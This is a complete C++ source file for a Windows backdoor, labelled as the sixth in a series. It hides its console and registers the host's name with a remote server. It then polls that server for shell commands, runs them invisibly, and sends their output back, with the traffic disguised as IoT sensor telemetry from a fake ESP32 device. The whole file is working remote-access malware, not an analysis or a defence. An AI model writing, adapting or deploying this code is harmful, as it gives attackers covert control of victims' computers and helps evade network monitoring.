// SIMPLIFIED BACKDOOR 6: MQTT-like using HTTP (No Paho)
// MQTT-LIKE SHELL USING HTTP POLLING - NO PAHO NEEDED
// Compile: g++ backdoor6_simple.cpp -o backdoor6.exe -lwinhttp -static

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <thread>
#include <random>
#pragma comment(lib, "winhttp.lib")

#define SERVER L"mqtt.eclipseprojects.io"  // CHANGE THIS
#define PORT 1883
#define POLL_INTERVAL 5000

class MQTTSimpleShell {
private:
    std::string deviceId;
    HINTERNET hSession;
    
    std::string GenerateDeviceId() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 15);
        
        const char* hex = "0123456789abcdef";
        std::string id = "ESP32_";
        for (int i = 0; i < 8; i++) {
            id += hex[dis(gen)];
        }
        return id;
    }
    
    std::string ExecuteCommand(const char* cmd) {
        std::string result;
        
        // Handle 'cd' command
        std::string cmdStr(cmd);
        if (cmdStr.find("cd ") == 0) {
            std::string path = cmdStr.substr(3);
            if (SetCurrentDirectoryA(path.c_str())) {
                char cwd[MAX_PATH];
                GetCurrentDirectoryA(MAX_PATH, cwd);
                result = std::string(cwd);
            } else {
                result = "Failed to change directory";
            }
            return result;
        }
        
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0))
            return "Error creating pipe";
        
        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
        
        PROCESS_INFORMATION pi;
        
        char* cmdMutable = _strdup(cmd);
        
        if (CreateProcessA(NULL, cmdMutable, NULL, NULL, TRUE, 
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            
            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hRead, buffer, sizeof(buffer)-1, &bytesRead, NULL) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        free(cmdMutable);
        CloseHandle(hRead);
        CloseHandle(hWrite);
        
        return result.empty() ? "OK" : result;
    }
    
    bool HttpPost(const std::string& path, const std::string& data) {
        HINTERNET hConnect = WinHttpConnect(hSession, SERVER, PORT, 0);
        if (!hConnect) return false;
        
        std::wstring wpath(path.begin(), path.end());
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
            NULL, WINHTTP_NO_REFERER, 
            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            return false;
        }
        
        std::string headers = "Content-Type: text/plain\r\n";
        std::wstring wheaders(headers.begin(), headers.end());
        
        BOOL result = WinHttpSendRequest(hRequest, wheaders.c_str(), headers.length(),
            (LPVOID)data.c_str(), data.length(), data.length(), 0);
        
        if (result)
            WinHttpReceiveResponse(hRequest, NULL);
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return result == TRUE;
    }
    
    std::string HttpGet(const std::string& path) {
        std::string result;
        HINTERNET hConnect = WinHttpConnect(hSession, SERVER, PORT, 0);
        if (!hConnect) return "";
        
        std::wstring wpath(path.begin(), path.end());
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
            NULL, WINHTTP_NO_REFERER, 
            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
        
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            return "";
        }
        
        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
            
            WinHttpReceiveResponse(hRequest, NULL);
            
            char buffer[4096];
            DWORD bytesRead;
            while (WinHttpReadData(hRequest, buffer, sizeof(buffer)-1, &bytesRead) 
                   && bytesRead > 0) {
                buffer[bytesRead] = 0;
                result += buffer;
            }
        }
        
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return result;
    }
    
    void SendTelemetry() {
        while (true) {
            std::string telemetry = "{\"sensor\":\"environment\"," +
                std::string("\"temperature\":") + 
                std::to_string(20 + (rand() % 10)) + "," +
                "\"humidity\":" + std::to_string(30 + (rand() % 40)) + "}";
            
            HttpPost("/telemetry/" + deviceId + "/sensors", telemetry);
            Sleep(60000);
        }
    }
    
public:
    MQTTSimpleShell() : deviceId(GenerateDeviceId()) {
        hSession = WinHttpOpen(L"Mozilla/5.0", 
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME, 
            WINHTTP_NO_PROXY_BYPASS, 0);
        FreeConsole();
        srand(time(NULL));
    }
    
    ~MQTTSimpleShell() {
        if (hSession) WinHttpCloseHandle(hSession);
    }
    
    void Run() {
        // Start telemetry thread
        std::thread(&MQTTSimpleShell::SendTelemetry, this).detach();
        
        // Register device
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        std::string status = "{\"device\":\"" + deviceId + 
            "\",\"status\":\"online\",\"host\":\"" + hostname + "\"}";
        HttpPost("/telemetry/" + deviceId + "/status", status);
        
        while (true) {
            // Poll for commands
            std::string cmd = HttpGet("/iot/" + deviceId + "/command");
            
            if (!cmd.empty() && cmd != "null" && cmd != "none") {
                if (cmd.find("CMD:") == 0) {
                    std::string command = cmd.substr(4);
                    std::string output = ExecuteCommand(command.c_str());
                    
                    std::string response = "{\"sensor\":\"cmd_response\",\"value\":\"" + 
                        output + "\"}";
                    HttpPost("/telemetry/" + deviceId + "/response", response);
                }
            }
            
            Sleep(POLL_INTERVAL);
        }
    }
};

int main() {
    MQTTSimpleShell shell;
    shell.Run();
    return 0;
}